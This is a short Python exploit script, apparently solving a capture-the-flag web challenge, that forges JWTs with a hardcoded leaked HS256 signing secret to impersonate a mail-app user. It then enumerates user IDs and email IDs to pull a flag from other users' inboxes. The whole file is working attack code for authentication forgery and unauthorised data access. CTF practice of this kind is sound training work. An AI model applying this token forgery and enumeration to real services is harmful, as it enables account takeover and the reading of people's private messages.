import jwt
import requests
import re
from datetime import datetime, timedelta

BASE_URL = "http://challenges.1pc.tf:41103"
SECRET = "f0d08a60411f9352adb8304c72e85f206a46d0e596eb17b34cc5007492bc7bdc"

def make_token(user_id, username, is_admin=0):
    payload = {
        'user_id': user_id,
        'username': username,
        'is_admin': is_admin,
        'exp': datetime.utcnow() + timedelta(hours=24)
    }
    return jwt.encode(payload, SECRET, algorithm='HS256')

def extract_flag(text):
    flags = re.findall(r'C2C\{[^}]+\}', text)
    if flags:
        for f in flags:
            print(f"\n{'='*50}\n  FLAG: {f}\n{'='*50}")
        return True
    return False

if __name__ == "__main__":
    # Mike Wilson is user_id 3 (seeded 4th: admin=1, john=2, jane=3... wait)
    # Seed order in db.py: admin=1, john.doe=2, jane.smith=3, mike.wilson=4, sarah.jones=5
    
    # Try as mike.wilson (user_id=4) — he RECEIVED the flag email
    print("[*] Trying as mike.wilson (non-admin, can read his own inbox)...")
    for mike_id in [3, 4, 5]:  # try all possibilities
        token = make_token(mike_id, 'mike.wilson', is_admin=0)
        cookies = {"token": token}
        
        # Check inbox
        r = requests.get(f"{BASE_URL}/inbox", cookies=cookies)
        print(f"    /inbox as user_id={mike_id}: {r.status_code}")
        if extract_flag(r.text):
            break

        # Try reading each email as this user
        for email_id in range(1, 16):
            r = requests.get(f"{BASE_URL}/email/{email_id}", cookies=cookies)
            if r.status_code == 200:
                print(f"    Email {email_id} accessible as user_id={mike_id}")
                if extract_flag(r.text):
                    break
